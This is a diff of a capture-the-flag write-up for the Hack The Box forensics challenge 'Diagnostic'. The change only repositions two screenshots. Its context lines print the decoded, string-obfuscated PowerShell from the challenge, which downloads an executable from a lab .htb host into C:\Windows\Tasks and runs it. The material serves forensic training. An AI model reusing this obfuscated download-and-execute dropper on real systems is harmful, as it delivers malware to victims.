@@ -47,6 +47,11 @@ The Diagnostic challenge, categorized under Forensics on Hack The Box, serves as
 - Convert characters to ASCII using the **ASCII table** from ascii.com.
 - Use an online tool (e.g., CyberChef) to convert parts of the content to **base64 strings**.
 
+![image](/img/Diagnostic/diagnostic7.png)
+
+
+![Image](/img/Diagnostic/diagnostic6.png)
+
 
 **Decoded content**
 
@@ -211,8 +216,6 @@ Naught can break the friendships formed at
 Dear old N.C.U.
 ```
 
-![image](/img/Diagnostic/diagnostic7.png)
-
 
 **Step 4: Uncovering the Decoded Message**
 
@@ -226,10 +229,7 @@ ${f`ile} = ("{7}{1}{6}{8}{5}{3}{2}{4}{0}"-f'}.exe','B{msDt_4s_A_pr0','E','r...s'
 &("{1}{2}{0}{3}"-f'ues','Invoke','-WebReq','t') ("{2}{8}{0}{4}{6}{5}{3}{1}{7}"-f '://au','.htb/2','h','ic','to','agnost','mation.di','/n.exe','ttps') -OutFile "C:\Windows\Tasks\$file"
 &((("{5}{6}{2}{8}{0}{3}{7}{4}{1}" -f'L9FTasksL9F','ile','ow','L','f','C:','L9FL9FWind','9FkzH','sL9F'))  -CReplAce'kzH',[chAr]36 -CReplAce([chAr]76+[chAr]57+[chAr]70),[chAr]92)
 ```
-
-![Image](/img/Diagnostic/diagnostic6.png)
     
-
 - Decoded message reveals a PowerShell script with interesting concatenation.
 
 ```
